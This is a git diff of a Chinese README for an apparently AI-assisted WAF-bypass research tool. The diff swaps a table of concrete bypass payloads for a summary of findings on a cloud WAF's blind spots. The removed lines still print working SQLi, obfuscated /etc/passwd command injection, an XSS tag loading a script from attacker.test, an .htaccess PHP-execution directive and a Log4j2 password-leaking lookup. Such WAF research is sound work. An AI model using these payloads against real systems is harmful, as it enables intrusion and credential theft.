@@ -69,39 +69,34 @@ python3 platform/server.py --port 8787    # http://127.0.0.1:8787
 
 ---
 
-## 📊 样本成果（实测通过样本库）
+## 🔬 研究发现（WAF 语义引擎能力边界）
 
-> 口径：样本库为 **AI 生成 → 远程实测全量记录**（HTTP 200 = WAF 放行 / 403 = 拦截）。**绕过率按实测计算，非 100%**——每个样本都是真实请求，被拦的也如实入库。
+> 研究结论来自对真实云 WAF 的**授权远程实测**。样本载荷库是本地运行积累成果，不入库——本仓库只沉淀方法与结论。
 
-| 指标 | 值 |
-|---|---|
-| 样本库总量 | **5,295**（已通过 2,050 · 被拦截 3,245） |
-| 整体绕过率 | **≈39%**（2,050/5,295，历史累计口径） |
-| 场景通过分布 | sqli 1,610 · cmdi 399 · upload 28 · xss 7（验证中）· log4j2 6（验证中） |
-| 已确认技法 | **18**（confirmed ≥60% 通过率，跨 5 场景） |
-| 知识库原语 | **216** |
-| 实测环境 | 真实腾讯云 WAF（远程，200=放行 / 403=拦截） |
+**语义引擎检测强、边界失手**：
 
-**本轮有效技法（真实通过云 WAF）**：
+1. **对"形态完整"攻击检测强**：SQLi 结构变换、XSS 标签/事件、Log4j2 全 JNDI 混淆家族（rmi/dns/iiop/哈希片段/无点ı/lower/嵌套）均被语义化覆盖。
+2. **对"零脚本语法"gadget 失手**：DOM clobbering（`<img name=currentScript>`）等无任何脚本语法的向量未被识别——这是语义引擎对"无特征形态"的结构性盲区。
+3. **词法拆分最通用**：关键字双写/引号拆分/反斜杠靠"打断关键字连续匹配"稳定突破，sqli 与 cmdi 双场景互验。
+4. **Log4j2 检出单向**：JNDI 混淆全拦，但 `${bundle:}`/`${env:}` 等非 JNDI 信息泄露 lookup 全放行——信息泄露面是缺口。
+5. **上传配置注入盲区**：`.htaccess`/`user.ini` 配置指令、扩展名、multipart `filename*` 解析器差异类向量未拦，可执行 PHP 内容则被严格拦截。
 
-| 技法 | 结构/原语 | 示例 |
-|------|------|------|
-| CASE WHEN × REGEXP 布尔盲注 | 函数布尔盲注（原零通过，破 54 变体） | `1 AND CASE WHEN (SELECT flag FROM flags LIMIT 1) REGEXP 0x5e66 THEN 1 ELSE 2 END=1` |
-| 引号拆分族 | `gen:quote_split_all`（64% confirmed） | `1 A'ND CA'SE WH'EN (SEL'ECT ...)` |
-| 关键字双重写 | `gen:double_write_all`（56% boundary） | `1 ANDand CASEcase WHENwhen ...` |
-| CMDi 参数展开 | 环境变量/空参（原零通过，破 10 变体） | `:;true && c'at${PATH:0:1}etc${PATH:0:1}passwd` |
-| CMDi ANSI-C 引号 | `cmdi:lexical:ansi_c_quoting` | `$'\143\141\164' $'\057\145\164\143\057\160\141\163\163\167\144'` |
-| XSS DOM clobbering | xss 首个通过向量（3 变体） | `<img name="currentScript" src="https://attacker.test/evil.js">` |
-| Upload 配置注入 | .htaccess / user.ini（43% 通过） | `AddType application/x-httpd-php .png` |
-| Log4j2 非 JNDI 泄露 | `log4j2:lookup:info_disclosure` | `${bundle:application:spring.datasource.password}` |
+**代表性技法**（按场景，载荷库为本地成果）：
 
-**关键洞察**：
+| 场景 | 代表技法 |
+|------|---------|
+| SQLi | CASE WHEN × REGEXP 布尔盲注 · 关键字双重写 · 引号拆分 |
+| CMDi | 参数展开 `${PATH:0:1}` 拼路径 · ANSI-C 引号 · 逻辑链稀释 |
+| XSS | DOM clobbering（gadget 型，无脚本语法） |
+| Upload | 配置注入（.htaccess/.user.ini）· multipart 解析器差异 |
+| Log4j2 | 非 JNDI lookup 信息泄露 |
 
-1. **语义引擎对"形态完整"攻击检测强、对"零脚本语法"失手**：SQLi 结构、XSS 标签事件、JNDI 全混淆家族都被语义化覆盖；但**无任何脚本语法的 gadget（DOM clobber `<img name=currentScript>`）和配置指令（.htaccess/user.ini）是明确盲区**。
-2. **词法拆分是最通用杠杆**：双写/引号拆分/反斜杠在 sqli 与 cmdi 双场景互验，靠"打断关键字连续匹配"稳定突破。
-3. **Log4j2 检出强但单向**：JNDI 13 类混淆（rmi/dns/iiop/哈希片段/无点ı/lower/嵌套）全拦，但 `${bundle:}`/`${env:}` 非 JNDI 泄露全放行——信息泄露面是结构性缺口。
-4. **绕过率是画出来的，不是标出来的**：云 WAF 总体拦截强（整体 38%），突破集中在边界结构；已确认技法与"样本通过"严格区分，杜绝"100% 通过"式失真。
-5. **基线稳定**：WAF 规则更新（X-WAF-UUID 变更）后复验代表样本 17/17 仍通过。
+**工程能力**（学习循环让 skill 持续变强）：
+
+- 结构覆盖报告驱动"生成前锁定零通过/低覆盖结构"
+- 语句合成器从「语句骨架 × 语法部件」结构性生成全新语句
+- 通过样本按结构类策展进进化种子库
+- WAF 规则升级检测（X-WAF-UUID 追踪）+ 基线复验
 
 ---
 
@@ -129,7 +124,7 @@ curl "http://localhost:8090/sqli/level1.php?id=1+UNION+SELECT+1,2,3"   # → 403
 │   ├── lib/                          #   schema / 生成器 / 远程执行器 / 学习分析
 │   │   ├── composer.py               #     语句合成器（结构性生成新语句）
 │   │   └── structures.py             #     攻击结构分类 / 覆盖报告 / 新颖性缺口
-│   ├── knowledge/                    #   知识库(216原语) + 已确认技法 + 种子库
+│   ├── knowledge/                    #   知识库(216原语) + 已确认技法（种子/样本库为本地运行成果，不入库）
 │   ├── corpus/                       #   样本库 samples.jsonl + 测试事件 tests.jsonl
 │   ├── scripts/                      #   run_round.py 一轮循环 / curate_seeds.py 种子策展
 │   ├── rounds/                       #   各轮探针与结果记录
